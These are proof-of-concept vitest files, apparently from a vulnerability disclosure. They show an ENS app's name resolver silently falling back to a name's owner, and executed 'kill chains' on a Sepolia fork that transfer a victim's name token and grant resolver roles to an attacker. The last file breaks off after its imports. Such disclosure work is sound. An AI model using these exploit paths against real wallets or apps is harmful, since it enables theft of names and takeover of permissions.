  it('control: a name WITH an addr record returns the record — the owner fallback is NOT consulted', async () => {
    h.getEnsAddress.mockResolvedValue(RECORD_HOLDER)
    const out = await resolveAddressOrName({
      client: {} as never,
      nameOrAddress: TYPED_NAME,
    })
    expect(out).toBe(RECORD_HOLDER)
    expect(h.getEnsAddress).toHaveBeenCalledOnce()
    expect(h.getEnsOwner).not.toHaveBeenCalled()
    LOG(`name with addr record → ${out} (record, fallback not consulted)`)
  })

  it('CORE: a name with NO addr record silently resolves to its CURRENT OWNER (the attacker)', async () => {
    h.getEnsAddress.mockResolvedValue(null) // UniversalResolver: no addr record
    h.getEnsOwner.mockResolvedValue(okResult({ owner: ATTACKER }))

    const out = await resolveAddressOrName({
      client: {} as never,
      nameOrAddress: TYPED_NAME,
    })

    expect(out).toBe(ATTACKER)
    expect(h.getEnsAddress).toHaveBeenCalledOnce()
    expect(h.getEnsOwner).toHaveBeenCalledOnce()
    LOG(
      `"${TYPED_NAME}" has no addr record → helper returned ${out} = name OWNER (attacker), ` +
        'indistinguishable from a real resolution to every downstream consumer',
    )
  })

  it('sink 2 (role grantee): prepareGrantRolesTransaction encodes grantRoles(…, attacker) with the ROLE_SET_RESOLVER bit', async () => {
    h.getEnsAddress.mockResolvedValue(null)
    h.getEnsOwner.mockResolvedValue(okResult({ owner: ATTACKER }))
    const grantee = (await resolveAddressOrName({
      client: {} as never,
      nameOrAddress: TYPED_NAME,
    }))!

    const intent = prepareGrantRolesTransaction({
      name: 'victim.eth', // the victim's own name, whose roles they manage
      account: grantee,
      roles: ['ROLE_SET_RESOLVER'],
      walletClient,
      chainId: sepoliaWithEns.id,
      registryAddress: REGISTRY,
    })

    expect(intent.request.to).toBe(REGISTRY)
    const decoded = decodeFunctionData({ abi: grantRolesAbi, data: intent.request.data })
    expect(decoded.functionName).toBe('grantRoles')
    const [resource, roleBitmap, account] = decoded.args
    expect(account).toBe(ATTACKER)
    expect(resource).toBe(labelToCanonicalId('victim'))
    expect(roleBitmap & (1n << 24n)).toBe(1n << 24n) // ROLE_SET_RESOLVER bit set
    LOG(
      `grantRoles(resource=canonicalId('victim'), bitmap=0x${roleBitmap.toString(16)} ` +
        `[ROLE_SET_RESOLVER], account=${account}) → attacker can repoint victim.eth's resolver`,
    )
  })

  it('sink 3 (registry-root grantee): prepareGrantRegistryRolesTransaction encodes grantRootRoles(…, attacker) on ROOT_RESOURCE', async () => {
    h.getEnsAddress.mockResolvedValue(null)
    h.getEnsOwner.mockResolvedValue(okResult({ owner: ATTACKER }))
    const grantee = (await resolveAddressOrName({
      client: {} as never,
      nameOrAddress: TYPED_NAME,
    }))!

    const intent = prepareGrantRegistryRolesTransaction({
      registryAddress: REGISTRY,
      account: grantee,
      roles: ['ROLE_SET_SUBREGISTRY'],
      walletClient,
      chainId: sepoliaWithEns.id,
    })

    expect(intent.request.to).toBe(REGISTRY)
    const decoded = decodeFunctionData({ abi: grantRootRolesAbi, data: intent.request.data })
    expect(decoded.functionName).toBe('grantRootRoles') // ROOT_RESOURCE entrypoint
    const [roleBitmap, account] = decoded.args
    expect(account).toBe(ATTACKER)
    expect(roleBitmap).toBeGreaterThan(0n)
    LOG(
      `grantRootRoles(bitmap=0x${roleBitmap.toString(16)}, account=${account}) — registry-WIDE ` +
        '(ROOT_RESOURCE=0) role handed to the attacker',
    )
  })

  it('sink 4 (resolver grantee, default ROOT scope): prepareGrantResolverRolesTransaction encodes grantRootRoles(…, attacker) on the resolver', async () => {
    h.getEnsAddress.mockResolvedValue(null)
    h.getEnsOwner.mockResolvedValue(okResult({ owner: ATTACKER }))
    const grantee = (await resolveAddressOrName({
      client: {} as never,
      nameOrAddress: TYPED_NAME,
    }))!

    const intent = prepareGrantResolverRolesTransaction({
      resolverAddress: RESOLVER,
      name: '', // ROOT scope — "Root (all nodes)", the sheet's default
      account: grantee,
      roles: ['ROLE_SET_ADDR'],
      walletClient,
      chainId: sepoliaWithEns.id,
    })

    expect(intent.request.to).toBe(RESOLVER)
    const decoded = decodeFunctionData({ abi: grantRootRolesAbi, data: intent.request.data })
    expect(decoded.functionName).toBe('grantRootRoles')
    const [roleBitmap, account] = decoded.args
    expect(account).toBe(ATTACKER)
    expect(roleBitmap).toBeGreaterThan(0n)
    LOG(
      `resolver grantRootRoles(bitmap=0x${roleBitmap.toString(16)}, account=${account}) — ` +
        'ROLE_SET_ADDR over ALL names on the shared resolver goes to the attacker',
    )
  })

  it('sink 1 (transfer recipient): transferToken encodes safeTransferFrom(victim, ATTACKER, tokenId, 1) — the name NFT itself', async () => {
    h.getEnsAddress.mockResolvedValue(null)
    h.getEnsOwner.mockResolvedValue(okResult({ owner: ATTACKER }))
    const recipient = (await resolveAddressOrName({
      client: {} as never,
      nameOrAddress: TYPED_NAME,
    }))!

    const tokenId = (BigInt(labelhash('victim')) >> 32n) << 32n
    await transferToken({
      name: 'victim.eth',
      registryAddress: REGISTRY,
      tokenId,
      recipient,
      walletClient,
      publicClient: {} as never,
      signer: {} as never,
      chainId: sepoliaWithEns.id,
      id: 'poc-transfer',
    })

    expect(h.capturedIntent).not.toBeNull()
    expect(h.capturedIntent!.request.to).toBe(REGISTRY)
    const decoded = decodeFunctionData({
      abi: safeTransferFromAbi,
      data: h.capturedIntent!.request.data,
    })
    expect(decoded.functionName).toBe('safeTransferFrom')
    const [from, to, id, amount] = decoded.args
    expect(from).toBe(victimAccount.address)
    expect(to).toBe(ATTACKER)
    expect(id).toBe(tokenId)
    expect(amount).toBe(1n)
    LOG(
      `safeTransferFrom(from=${from}, to=${to}, tokenId=0x${id.toString(16)}, amount=1) — ` +
        'the victim\'s name token moves to the attacker; irreversible',
    )
  })

  it('sink 5 (subname owner): prepareCreateSubnameTransaction encodes register(label, ATTACKER, …)', async () => {
    h.getEnsAddress.mockResolvedValue(null)
    h.getEnsOwner.mockResolvedValue(okResult({ owner: ATTACKER }))
    const owner = (await resolveAddressOrName({
      client: {} as never,
      nameOrAddress: TYPED_NAME,
    }))!

    const intent = prepareCreateSubnameTransaction({
      registryAddress: REGISTRY,
      label: 'payroll',
      owner,
      resolverAddress: RESOLVER,
      walletClient,
      chainId: sepoliaWithEns.id,
      expires: 1_800_000_000n,
    })

    const decoded = decodeFunctionData({ abi: registerAbi, data: intent.request.data })
    expect(decoded.functionName).toBe('register')
    const [label, ownerArg] = decoded.args
    expect(label).toBe('payroll')
    expect(ownerArg).toBe(ATTACKER)
    LOG(
      `register('payroll', owner=${ownerArg}, …) — the new subname payroll.victim.eth ` +
        'is minted straight to the attacker',
    )
  })
})
```

### PoC file (ownerFallbackResolution.fork.test.ts)

```ts
import { spawn, type ChildProcess } from 'node:child_process'
import { setTimeout as delay } from 'node:timers/promises'
import {
  type Address,
  type Hex,
  createPublicClient,
  createTestClient,
  createWalletClient,
  decodeFunctionData,
  encodeFunctionData,
  erc20Abi,
  erc1155Abi,
  http,
  namehash,
  parseAbi,
  parseEventLogs,
  toHex,
  zeroAddress,
  zeroHash,
} from 'viem'
import { generatePrivateKey, privateKeyToAccount } from 'viem/accounts'
import { packetToBytes } from 'viem/ens'
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest'
import { getEnsAddress } from 'viem/actions'
import { getChainContractAddress } from '@ensdomains/ensjs/chain'
import {
  getNameRegistries,
  getOwner as getOwnerV2,
  hasRoles,
} from '@ensdomains/ensjs/public/v2'

const LOG = (...args: unknown[]) => console.log('[owner-fallback:fork]', ...args)

const UPSTREAM_RPC = 'https://ethereum-sepolia-rpc.publicnode.com'
const ANVIL_PORT = 8556
const ANVIL_URL = `http://127.0.0.1:${ANVIL_PORT}`
const ANVIL_BIN = process.env.ANVIL_BIN ?? 'anvil' // foundry's anvil on PATH; override via env
const EXPECTED_REGISTRAR = '0xa88553F454b77203B0D036A05c894d555EAAa2Cc'

const REG_DURATION = 31_536_000n // 1y
const MINT_AMOUNT = 1_000n * 10n ** 18n

const daiMintAbi = parseAbi(['function mint(address to, uint256 amount)'])
const registrarAbi = parseAbi([
  'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) view returns (bytes32)',
  'function commit(bytes32 commitment)',
  'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer)',
  'function isAvailable(string label) view returns (bool)',
  'event NameRegistered(uint256 indexed tokenId, string label, address owner, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 indexed referrer, uint256 base, uint256 premium)',
])
const addrRecordAbi = parseAbi(['function addr(bytes32 node) view returns (address)'])
const urResolveAbi = parseAbi([
  'function resolveWithGateways(bytes name, bytes data, string[] gateways) view returns (bytes, address)',
  'error ResolverNotFound(bytes)',
  'error ResolverNotContract()',
  'error ResolverError()',
  'error UnsupportedResolverProfile(bytes data)',
])

let resolveAddressOrName: typeof import('@/features/roles/helpers/addUser.handlers').resolveAddressOrName
let universalResolverAddress: Address
let officialPublicResolverAddress: Address
let REGISTRAR: Address
let DAI: Address
let sepoliaWithEns: typeof import('@/lib/wagmi').sepoliaWithEns
let getEnsTokenId: typeof import('@/features/profile/hooks/useTokenId').getEnsTokenId
let transferToken: typeof import('@/features/transfer/helpers/transferToken').transferToken
let createEOASigner: typeof import('@/features/registry/utils/signer.helpers').createEOASigner
let prepareGrantRolesTransaction: typeof import('@/features/roles/helpers/grantRoles').prepareGrantRolesTransaction
let prepareGrantRegistryRolesTransaction: typeof import('@/features/registry/helpers/grantRegistryRoles').prepareGrantRegistryRolesTransaction
let prepareDeploySubregistryTransaction: typeof import('@/features/registry/helpers/deploySubregistry').prepareDeploySubregistryTransaction

let anvil: ChildProcess | null = null
let pinnedBlock = 0n
let publicClient: ReturnType<typeof createPublicClient>
let testClient: ReturnType<typeof createTestClient>
let attackerWallet: ReturnType<typeof createWalletClient>
let ATTACKER: Address
let victimWallet: ReturnType<typeof createWalletClient>
let VICTIM: Address
let LABEL_VIC = ''
let victimRegistry: Address
let victimTokenId = 0n

const waitReceipt = async (hash: Hex) =>
  publicClient.waitForTransactionReceipt({ hash })

const registerName = async (
  label: string,
  resolver: Address,
  owner: Address,
  ownerWallet: ReturnType<typeof createWalletClient>,
) => {
  const secret = generatePrivateKey() // commitment entropy only
  const commitment = await publicClient.readContract({
    address: REGISTRAR,
    abi: registrarAbi,
    functionName: 'makeCommitment',
    args: [label, owner, secret, zeroAddress, resolver, REG_DURATION, zeroHash],
  })
  expect(
    (await waitReceipt(
      await ownerWallet.writeContract({
        address: REGISTRAR,
        abi: registrarAbi,
        functionName: 'commit',
        args: [commitment],
      }),
    )).status,
  ).toBe('success')

  await testClient.increaseTime({ seconds: 61 })
  await testClient.mine({ blocks: 1 })

  const registerHash = await ownerWallet.writeContract({
    address: REGISTRAR,
    abi: registrarAbi,
    functionName: 'register',
    args: [label, owner, secret, zeroAddress, resolver, REG_DURATION, DAI, zeroHash],
  })
  const receipt = await waitReceipt(registerHash)
  expect(receipt.status).toBe('success')
  const ev = parseEventLogs({ abi: registrarAbi, logs: receipt.logs }).find(
    (l) => l.eventName === 'NameRegistered',
  )
  expect(ev && ev.args.owner).toBe(owner)
  expect(ev && ev.args.resolver?.toLowerCase()).toBe(resolver.toLowerCase())
  LOG(`registered ${label}.eth: tx=${registerHash} resolver=${resolver} owner=${owner}`)
}

beforeAll(async () => {
  vi.stubEnv('VITE_SEPOLIA_RPC_URL', ANVIL_URL)

  const upstream = createPublicClient({
    transport: http(UPSTREAM_RPC, { retryCount: 8, retryDelay: 1_500 }),
  })
  for (let attempt = 1; attempt <= 6; attempt++) {
    try {
      pinnedBlock = await upstream.getBlockNumber()
      break
    } catch (error) {
      LOG(`pin attempt ${attempt} failed: ${(error as Error).message.slice(0, 100)}`)
      if (attempt === 6) throw error
      await delay(3_000 * attempt)
    }
  }
  LOG(`pinned Sepolia block: ${pinnedBlock}`)

  const anvilTail: string[] = []
  const capture = (chunk: Buffer) => {
    anvilTail.push(chunk.toString())
    if (anvilTail.length > 200) anvilTail.shift()
  }
  anvil = spawn(
    ANVIL_BIN,
    [
      '--fork-url', UPSTREAM_RPC,
      '--fork-block-number', pinnedBlock.toString(),
      '--port', String(ANVIL_PORT),
      '--block-time', '1',
    ],
    { stdio: ['ignore', 'pipe', 'pipe'] },
  )
  anvil.stdout?.on('data', capture)
  anvil.stderr?.on('data', capture)
  let anvilExit: number | null = null
  anvil.on('exit', (code) => {
    anvilExit = code
  })

  ;({ resolveAddressOrName } = await import(
    '@/features/roles/helpers/addUser.handlers'
  ))
  const ur = await import('@/lib/constants/universalResolver')
  universalResolverAddress = ur.universalResolverAddress
  officialPublicResolverAddress = ur.officialPublicResolverAddress
  ;({ sepoliaWithEns } = await import('@/lib/wagmi'))
  const { getRenewerAddress } = await import('@/features/renew/utils/renewer')
  REGISTRAR = getRenewerAddress(true) // the app's own v2 ETHRegistrar resolver
  expect(REGISTRAR.toLowerCase()).toBe(EXPECTED_REGISTRAR.toLowerCase())
  const { SUPPORTED_TOKENS } = await import('@/lib/constants/tokens')
  DAI = SUPPORTED_TOKENS.DAI
  ;({ getEnsTokenId } = await import('@/features/profile/hooks/useTokenId'))
  ;({ transferToken } = await import('@/features/transfer/helpers/transferToken'))
  ;({ createEOASigner } = await import(
    '@/features/registry/utils/signer.helpers'
  ))
  ;({ prepareGrantRolesTransaction } = await import(
    '@/features/roles/helpers/grantRoles'
  ))
  ;({ prepareGrantRegistryRolesTransaction } = await import(
    '@/features/registry/helpers/grantRegistryRoles'
  ))
  ;({ prepareDeploySubregistryTransaction } = await import(
    '@/features/registry/helpers/deploySubregistry'
  ))

  const transport = () =>
    http(ANVIL_URL, { retryCount: 8, retryDelay: 1_000, timeout: 60_000 })
  publicClient = createPublicClient({ chain: sepoliaWithEns, transport: transport() })
  testClient = createTestClient({
    mode: 'anvil',
    chain: sepoliaWithEns,
    transport: transport(),
  })

  const deadline = Date.now() + 120_000
  for (;;) {
    if (anvilExit !== null)
      throw new Error(
        `anvil exited early with code ${anvilExit}; output tail:\n${anvilTail.join('').slice(-2000)}`,
      )
    try {
      if ((await publicClient.getChainId()) === 11155111) break
    } catch {
    }
    if (Date.now() > deadline) throw new Error('anvil fork did not become ready in 120s')
    await delay(1_000)
  }
  LOG('anvil fork ready on', ANVIL_URL)

  const attacker = privateKeyToAccount(generatePrivateKey())
  ATTACKER = attacker.address
  attackerWallet = createWalletClient({
    account: attacker,
    chain: sepoliaWithEns,
    transport: transport(),
  })
  await testClient.setBalance({ address: ATTACKER, value: 10n ** 19n })

  expect(
    (await waitReceipt(
      await attackerWallet.writeContract({
        address: DAI,
        abi: daiMintAbi,
        functionName: 'mint',
        args: [ATTACKER, MINT_AMOUNT],
      }),
    )).status,
  ).toBe('success')
  expect(
    (await waitReceipt(
      await attackerWallet.writeContract({
        address: DAI,
        abi: erc20Abi,
        functionName: 'approve',
        args: [REGISTRAR, MINT_AMOUNT],
      }),
    )).status,
  ).toBe('success')

  const victim = privateKeyToAccount(generatePrivateKey())
  VICTIM = victim.address
  victimWallet = createWalletClient({
    account: victim,
    chain: sepoliaWithEns,
    transport: transport(),
  })
  await testClient.setBalance({ address: VICTIM, value: 10n ** 19n })
  await testClient.impersonateAccount({ address: VICTIM })
  expect(
    (await waitReceipt(
      await victimWallet.writeContract({
        address: DAI,
        abi: daiMintAbi,
        functionName: 'mint',
        args: [VICTIM, MINT_AMOUNT],
      }),
    )).status,
  ).toBe('success')
  expect(
    (await waitReceipt(
      await victimWallet.writeContract({
        address: DAI,
        abi: erc20Abi,
        functionName: 'approve',
        args: [REGISTRAR, MINT_AMOUNT],
      }),
    )).status,
  ).toBe('success')

  LOG('setup:', {
    registrar: REGISTRAR,
    universalResolver: universalResolverAddress,
    officialPublicResolver: officialPublicResolverAddress,
    dai: DAI,
    attacker: ATTACKER,
    victim: VICTIM,
  })
}, 360_000) // slow-public-RPC headroom: beforeAll pins a block and boots the fork

afterAll(async () => {
  vi.unstubAllEnvs()
  if (anvil && anvil.exitCode === null) {
    anvil.kill('SIGKILL')
    await delay(500)
  }
  anvil = null
})

const rand = () => Math.floor(Math.random() * 1_000_000).toString().padStart(6, '0')
const LABEL_NORES = `pocfb${rand()}nores`
const LABEL_RES = `pocfb${rand()}res`

describe('owner-fallback (fork leg): no-addr-record names resolve to their owner through the REAL app wiring', () => {
  it('setup: registers name A (resolver=0x0 — the app transfer flow’s detach default) and name B (official public resolver, no records) on the real v2 registrar', async () => {
    for (const label of [LABEL_NORES, LABEL_RES]) {
      expect(
        await publicClient.readContract({
          address: REGISTRAR,
          abi: registrarAbi,
          functionName: 'isAvailable',
          args: [label],
        }),
      ).toBe(true)
    }
    await registerName(LABEL_NORES, zeroAddress, ATTACKER, attackerWallet)
    await registerName(LABEL_RES, officialPublicResolverAddress, ATTACKER, attackerWallet)
  }, 360_000) // two live-priced commit/register rounds; flaky at 180s on slow-RPC days

  it('boundary truth: REAL viem getEnsAddress against the REAL UniversalResolver returns null for BOTH names (no addr record)', async () => {
    const addrA = await getEnsAddress(publicClient as never, {
      name: `${LABEL_NORES}.eth`,
      universalResolverAddress,
    })
    const addrB = await getEnsAddress(publicClient as never, {
      name: `${LABEL_RES}.eth`,
      universalResolverAddress,
    })
    expect(addrA).toBeNull()
    expect(addrB).toBeNull()
    LOG(
      `getEnsAddress(${LABEL_NORES}.eth) → ${addrA}; getEnsAddress(${LABEL_RES}.eth) → ${addrB} ` +
        '(real UniversalResolver on the fork)',
    )
  }, 180_000)

  it('direct eth_call: UR resolveWithGateways(addr) REVERTS for name A while ensjs getOwnerV2 returns the attacker as owner', async () => {
    const name = `${LABEL_NORES}.eth`
    const addrCall = encodeFunctionData({
      abi: addrRecordAbi,
      functionName: 'addr',
      args: [namehash(name)],
    })
    let revertText = ''
    try {
      await publicClient.readContract({
        address: universalResolverAddress,
        abi: urResolveAbi,
        functionName: 'resolveWithGateways',
        args: [toHex(packetToBytes(name)), addrCall, []],
      })
      throw new Error('UR resolve unexpectedly succeeded for a resolverless name')
    } catch (error) {
      revertText = String((error as Error).message)
    }
    expect(revertText).not.toContain('unexpectedly succeeded')
    LOG(`UR resolveWithGateways(${name}, addr) reverted with: ${revertText.slice(0, 300)}`)

    const owner = await getOwnerV2(publicClient as never, { name })
    expect(owner?.toLowerCase()).toBe(ATTACKER.toLowerCase())
    LOG(`getOwnerV2(${name}) → ${owner} (= attacker EOA)`)
  }, 180_000)

  it('CORE: the REAL resolveAddressOrName (app wagmiConfig → fork) returns the ATTACKER (owner) for the resolverless name A', async () => {
    const out = await resolveAddressOrName({
      client: publicClient as never,
      nameOrAddress: `${LABEL_NORES}.eth`,
    })
    expect(out?.toLowerCase()).toBe(ATTACKER.toLowerCase())
    LOG(
      `resolveAddressOrName("${LABEL_NORES}.eth") → ${out} — the name's OWNER, ` +
        'produced by the unmodified app helper against real chain state',
    )
  }, 180_000)

  it('CORE: the REAL resolveAddressOrName returns the ATTACKER (owner) for the resolver-set-but-recordless name B', async () => {
    const out = await resolveAddressOrName({
      client: publicClient as never,
      nameOrAddress: `${LABEL_RES}.eth`,
    })
    expect(out?.toLowerCase()).toBe(ATTACKER.toLowerCase())
    LOG(
      `resolveAddressOrName("${LABEL_RES}.eth") → ${out} — resolver exists, no addr record, ` +
        'fallback still substitutes the owner',
    )
  }, 180_000)
})

const grantRolesDecodeAbi = parseAbi([
  'function grantRoles(uint256 resource, uint256 roleBitmap, address account)',
  'function grantRootRoles(uint256 roleBitmap, address account)',
])
const proxyDeployedAbi = parseAbi([
  'event ProxyDeployed(address indexed sender, address indexed proxyAddress, uint256 salt, address implementation)',
])

const balanceOf = (account: Address, tokenId: bigint) =>
  publicClient.readContract({
    address: victimRegistry,
    abi: erc1155Abi,
    functionName: 'balanceOf',
    args: [account, tokenId],
  }) as Promise<bigint>

describe('owner-fallback (fork leg, executed kill chains): typed recordless name → on-chain loss', () => {
  it('victim setup: registers a real v2 name on the real registrar and holds ROLE_SET_RESOLVER(+_ADMIN) on it', async () => {
    LABEL_VIC = `pocfb${rand()}vic`
    expect(
      await publicClient.readContract({
        address: REGISTRAR,
        abi: registrarAbi,
        functionName: 'isAvailable',
        args: [LABEL_VIC],
      }),
    ).toBe(true)
    await registerName(LABEL_VIC, zeroAddress, VICTIM, victimWallet)

    const registries = await getNameRegistries(publicClient as never, {
      name: `${LABEL_VIC}.eth`,
    })
    victimRegistry = registries[1]
    expect(victimRegistry).toBeTruthy()
    const tokenIdResult = await getEnsTokenId({
      label: LABEL_VIC,
      registryAddress: victimRegistry,
    })
    expect(tokenIdResult.isOk()).toBe(true)
    victimTokenId = tokenIdResult._unsafeUnwrap()
    expect(victimTokenId).toBeGreaterThan(0n)

    expect(await balanceOf(VICTIM, victimTokenId)).toBe(1n)
    expect(await balanceOf(ATTACKER, victimTokenId)).toBe(0n)

    const victimCanGrantResolver = await hasRoles(publicClient as never, {
      registryAddress: victimRegistry,
      label: LABEL_VIC,
      roles: ['ROLE_SET_RESOLVER_ADMIN'],
      account: VICTIM,
    })
    const victimHasResolver = await hasRoles(publicClient as never, {
      registryAddress: victimRegistry,
      label: LABEL_VIC,
      roles: ['ROLE_SET_RESOLVER'],
      account: VICTIM,
    })
    LOG(
      `victim name: ${LABEL_VIC}.eth registry=${victimRegistry} tokenId=0x${victimTokenId.toString(16)} ` +
        `balance(victim)=1; on-chain roles: ROLE_SET_RESOLVER=${victimHasResolver} ` +
        `ROLE_SET_RESOLVER_ADMIN=${victimCanGrantResolver}`,
    )
    expect(victimHasResolver).toBe(true)
  }, 360_000) // live-priced commit/register; flaky at 180s on slow-RPC days

  it('KILL CHAIN 1 (transfer): typed recordless name → REAL resolution → REAL transferToken → the ERC-1155 name token sits with the ATTACKER on-chain', async () => {
    const typedInput = `${LABEL_NORES}.eth`
    const resolvedRecipient = await resolveAddressOrName({
      client: publicClient as never,
      nameOrAddress: typedInput,
    })
    expect(resolvedRecipient?.toLowerCase()).toBe(ATTACKER.toLowerCase())

    const { hash } = await transferToken({
      name: `${LABEL_VIC}.eth`,
      registryAddress: victimRegistry,
      tokenId: victimTokenId,
      recipient: resolvedRecipient!,
      walletClient: victimWallet,
      publicClient: publicClient as never,
      signer: createEOASigner(victimWallet),
      chainId: sepoliaWithEns.id,
      id: 'poc-killchain-transfer',
    })
    const receipt = await waitReceipt(hash)
    expect(receipt.status).toBe('success')

    expect(await balanceOf(VICTIM, victimTokenId)).toBe(0n)
    expect(await balanceOf(ATTACKER, victimTokenId)).toBe(1n)
    const ownerAfter = await getOwnerV2(publicClient as never, {
      name: `${LABEL_VIC}.eth`,
    })
    expect(ownerAfter?.toLowerCase()).toBe(ATTACKER.toLowerCase())
    LOG(
      `KILL CHAIN 1 EXECUTED: transfer tx=${hash} status=success; ` +
        `balanceOf(victim) 1→0, balanceOf(attacker) 0→1 on registry=${victimRegistry}; ` +
        `getOwnerV2(${LABEL_VIC}.eth) → ${ownerAfter}. ` +
        `The victim's only input was the ENS name "${typedInput}" — never ${ATTACKER}.`,
    )
  }, 180_000)

  it('KILL CHAIN 2 (role grant): typed recordless name → REAL resolution → REAL prepareGrantRolesTransaction → broadcast → hasRoles(attacker, ROLE_SET_RESOLVER) true on-chain', async () => {
    const label2 = `pocfb${rand()}grt`
    await registerName(label2, zeroAddress, VICTIM, victimWallet)
    const registries2 = await getNameRegistries(publicClient as never, {
      name: `${label2}.eth`,
    })
    const registry2 = registries2[1]

    const typedInput = `${LABEL_RES}.eth` // attacker's resolver-set, recordless name
    const resolvedGrantee = await resolveAddressOrName({
      client: publicClient as never,
      nameOrAddress: typedInput,
    })
    expect(resolvedGrantee?.toLowerCase()).toBe(ATTACKER.toLowerCase())

    const rolesBefore = await hasRoles(publicClient as never, {
      registryAddress: registry2,
      label: label2,
      roles: ['ROLE_SET_RESOLVER'],
      account: ATTACKER,
    })
    expect(rolesBefore).toBe(false)

    const intent = prepareGrantRolesTransaction({
      name: `${label2}.eth`,
      account: resolvedGrantee!,
      roles: ['ROLE_SET_RESOLVER'],
      walletClient: victimWallet,
      chainId: sepoliaWithEns.id,
      registryAddress: registry2,
    })
    expect(intent.request.to.toLowerCase()).toBe(registry2.toLowerCase())
    const decoded = decodeFunctionData({
      abi: grantRolesDecodeAbi,
      data: intent.request.data,
    })
    expect(decoded.functionName).toBe('grantRoles')
    expect(decoded.args[2].toLowerCase()).toBe(ATTACKER.toLowerCase())

    const hash = await victimWallet.sendTransaction({
      to: intent.request.to,
      data: intent.request.data,
    })
    const receipt = await waitReceipt(hash)
    expect(receipt.status).toBe('success')

    const rolesAfter = await hasRoles(publicClient as never, {
      registryAddress: registry2,
      label: label2,
      roles: ['ROLE_SET_RESOLVER'],
      account: ATTACKER,
    })
    expect(rolesAfter).toBe(true)
    LOG(
      `KILL CHAIN 2 EXECUTED: grantRoles tx=${hash} status=success; ` +
        `hasRoles(${label2}.eth resource, attacker, ROLE_SET_RESOLVER) false→true on registry=${registry2}; ` +
        `calldata grantRoles(resource=0x${decoded.args[0].toString(16)}, bitmap=0x${decoded.args[1].toString(16)}, account=${decoded.args[2]}). ` +
        `The victim's only input was the ENS name "${typedInput}". ` +
        'The attacker can now repoint the victim\'s name resolution.',
    )
  }, 180_000)

  it('KILL CHAIN 3 (registry-root): deploy a REAL subregistry via the portal prepare path, then grantRootRoles to the fallback-resolved attacker → hasRoles(ROOT, attacker) true on-chain', async () => {
    const factoryAddress = getChainContractAddress({
      chain: sepoliaWithEns,
      contract: 'ensVerifiableFactory',
    })
    const implAddress = getChainContractAddress({
      chain: sepoliaWithEns,
      contract: 'ensUserRegistryImpl',
    })
    const deployIntent = prepareDeploySubregistryTransaction({
      factoryAddress,
      implAddress,
      walletClient: victimWallet,
      chainId: sepoliaWithEns.id,
    })
    const deployHash = await victimWallet.sendTransaction({
      to: deployIntent.request.to,
      data: deployIntent.request.data,
    })
    const deployReceipt = await waitReceipt(deployHash)
    expect(deployReceipt.status).toBe('success')
    const deployed = parseEventLogs({
      abi: proxyDeployedAbi,
      logs: deployReceipt.logs,
    }).find((l) => l.eventName === 'ProxyDeployed')
    if (!deployed || deployed.eventName !== 'ProxyDeployed')
      throw new Error('ProxyDeployed event not found in deploy receipt')
    const subregistry = deployed.args.proxyAddress
    expect(subregistry).toBeTruthy()

    const victimRootAdmin = await hasRoles(publicClient as never, {
      registryAddress: subregistry,
      roles: ['ROLE_SET_RESOLVER_ADMIN'],
      account: VICTIM,
    })
    LOG(
      `subregistry deployed at ${subregistry} (tx=${deployHash}); ` +
        `victim ROLE_SET_RESOLVER_ADMIN at ROOT = ${victimRootAdmin}`,
    )

    if (!victimRootAdmin) {
      const typedInput = `${LABEL_NORES}.eth`
      const resolvedGrantee = await resolveAddressOrName({
        client: publicClient as never,
        nameOrAddress: typedInput,
      })
      expect(resolvedGrantee?.toLowerCase()).toBe(ATTACKER.toLowerCase())
      const intent = prepareGrantRegistryRolesTransaction({
        registryAddress: subregistry,
        account: resolvedGrantee!,
        roles: ['ROLE_SET_RESOLVER'],
        walletClient: victimWallet,
        chainId: sepoliaWithEns.id,
      })
      const hash = await victimWallet.sendTransaction({
        to: intent.request.to,
        data: intent.request.data,
        gas: 500_000n,
      })
      const receipt = await waitReceipt(hash)
      LOG(
        `KILL CHAIN 3 NOT AUTHORIZED on a fresh subregistry: grantRootRoles tx=${hash} ` +
          `status=${receipt.status} (the app's RegistryAddUserSheet would show all checkboxes ` +
          'disabled here — callerAdminRoles is empty). Root-grant substitution remains proven ' +
          'at the encoding level (unit leg).',
      )
      expect(receipt.status).toBe('reverted')
      return
    }

    const typedInput = `${LABEL_NORES}.eth`
    const resolvedGrantee = await resolveAddressOrName({
      client: publicClient as never,
      nameOrAddress: typedInput,
    })
    expect(resolvedGrantee?.toLowerCase()).toBe(ATTACKER.toLowerCase())

    const rootBefore = await hasRoles(publicClient as never, {
      registryAddress: subregistry,
      roles: ['ROLE_SET_RESOLVER'],
      account: ATTACKER,
    })
    expect(rootBefore).toBe(false)

    const intent = prepareGrantRegistryRolesTransaction({
      registryAddress: subregistry,
      account: resolvedGrantee!,
      roles: ['ROLE_SET_RESOLVER'],
      walletClient: victimWallet,
      chainId: sepoliaWithEns.id,
    })
    expect(intent.request.to.toLowerCase()).toBe(subregistry.toLowerCase())
    const decoded = decodeFunctionData({
      abi: grantRolesDecodeAbi,
      data: intent.request.data,
    })
    expect(decoded.functionName).toBe('grantRootRoles')
    expect(decoded.args[1].toLowerCase()).toBe(ATTACKER.toLowerCase())

    const hash = await victimWallet.sendTransaction({
      to: intent.request.to,
      data: intent.request.data,
    })
    const receipt = await waitReceipt(hash)
    expect(receipt.status).toBe('success')

    const rootAfter = await hasRoles(publicClient as never, {
      registryAddress: subregistry,
      roles: ['ROLE_SET_RESOLVER'],
      account: ATTACKER,
    })
    expect(rootAfter).toBe(true)
    LOG(
      `KILL CHAIN 3 EXECUTED: grantRootRoles tx=${hash} status=success; ` +
        `hasRoles(ROOT_RESOURCE, attacker, ROLE_SET_RESOLVER) false→true on subregistry=${subregistry}; ` +
        `calldata grantRootRoles(bitmap=0x${decoded.args[0].toString(16)}, account=${decoded.args[1]}). ` +
        `The victim's only input was the ENS name "${typedInput}" — registry-WIDE role handed over.`,
    )
  }, 240_000)
})
```

### PoC file (ownerFallbackExpiryEdge.fork.test.ts)

```ts
import { spawn, type ChildProcess } from 'node:child_process'
import { setTimeout as delay } from 'node:timers/promises'
import {
  type Address,
  type Hex,
  createPublicClient,
  createTestClient,
  createWalletClient,
  erc20Abi,
  http,
  parseAbi,
  parseEventLogs,
  zeroAddress,
  zeroHash,
} from 'viem'
import { generatePrivateKey, privateKeyToAccount } from 'viem/accounts'
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest'
